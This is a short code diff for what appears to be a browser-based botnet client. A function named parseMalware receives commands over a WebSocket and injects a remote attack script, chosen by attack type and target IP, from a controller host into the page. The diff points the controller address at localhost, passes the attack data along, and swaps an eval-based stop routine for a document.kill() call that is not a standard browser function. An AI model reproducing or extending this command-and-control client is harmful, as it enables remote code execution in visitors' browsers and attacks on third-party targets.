@@ -10,7 +10,7 @@ function WS4Redis(e,n){"use strict";function o(e){try{console.log("Connecting to
 
 
 (function($){
-var ip = "172.31.68.248";
+var ip = "127.0.0.1";
 
 var connect = false;
 
@@ -70,13 +70,15 @@ function parseMalware(msg){
 		script.src = "http://"+ip+"/"+msgJson.attacktype+".js";
 		script.type='text/javascript';
 		script.id="currentAttack";
-		$(script).data("attackInfo",msgJson.attackInfo['targetip']);
+		script.setAttribute("data-attackInfo",JSON.stringify(msgJson['attackInfo']));
+
 		$('head:first').append(script);
+
 	}
 
 	if(msgJson.hasOwnProperty('stopattack')){
-		var attackController = $("#currentAttack").data("killAttack");
-		eval(attackController);
+		document.kill()
+
 	}
 
 }
